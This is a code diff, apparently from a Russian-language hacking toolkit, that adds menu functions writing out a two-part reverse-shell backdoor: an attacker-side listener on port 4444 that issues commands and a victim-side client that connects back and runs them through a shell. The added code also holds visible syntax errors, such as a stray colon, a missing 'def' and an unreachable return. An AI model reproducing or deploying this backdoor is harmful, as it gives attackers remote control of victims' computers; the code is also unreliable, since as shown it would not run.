@@ -187,7 +187,99 @@ def DefSec4():
 			raise SystemExit
 		def Backdoor99():
 			DefSec4()
+		def Backdoor1():
+			os.chdir('USER-BD')
+			ip = input('Введите свой IP')
+			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
+			n = open(f,"w",encoding='utf-8')
+			n.write("""import socket, json
+#Хакер
+class Listener:
+	def __init__(self, ip, port):
+		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		listener.bind((ip, port)) 
+		listener.listen(0)
+		print('[*] Waiting for incoming connections')
+		self.connection, address = listener.accept()
+		print('[*] got a connection from' + str(address))
+
+	def reliable_send(self, data):
+		json_data = json.dumps(data):
+		self.connection.send(json_data)
+
+	def reliable_receive(self):
+		json_data = ""
+		while True:
+			try:
+				json_data = json_data + self.connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
+
+	def execute_remotely(self, command):
+		self.connection.send(command)
+		if command[0] == "exit":
+			self.connection.close()
+			exit()
 		
+		return self.reliable_receive()
+
+		return self.connection.recv(1024)
+	def go(self):
+		while True:
+			command = input("~#")
+			command = command.split(" ")
+			result = self.execute_remotely(command)
+			print(result)
+my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
+my_listener.go() """
+		Backdoor2():
+			os.chdir('USER-BD')
+			ip = input('Введите свой IP')
+			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
+			n = open(f,"w",encoding='utf-8')
+			n.write("""#Жертва
+import socket
+import subprocess
+import json
+class Backdoor:
+	def __init__(self, ip, port):
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.connection.connect((ip, port))
+	def reliable_send(self, data):
+		json_data = json.dumps(data):
+		self.connection.send(json_data)
+	def reliable_receive(self):
+		json_data = ""
+		while True:
+			try:
+				json_data = json_data + self.connection.recv(1024)
+				return json.loads(json_data)
+			except ValueError:
+				continue
+	def execute_system_command(self, command):
+
+		return subprocess.check_output(command, shell=True)
+	def run(self):
+		while True:
+			command = self.reliable_receive()
+			if command[0] == "exit":
+				self.connection.close()
+				exit()
+			command_result = self.execute_system_command(command)
+			self.reliable_send(command_result)
+	
+my_backdoor = Backdoor("ВВедите IP", 4444) #ip хакера обезательно!
+my_backdoor.run() """
+		if bdv1 ==1:
+			Backdoor1()
+		elif bdv1 ==2:
+			Backdoor2()
+		elif bdv1 ==99:
+			Backdoor99()
+		elif bdv1 ==0:
+			Backdoor0()
 	def Backdoor2():
 		print("Скоро(soon)")
 		time.sleep(5)
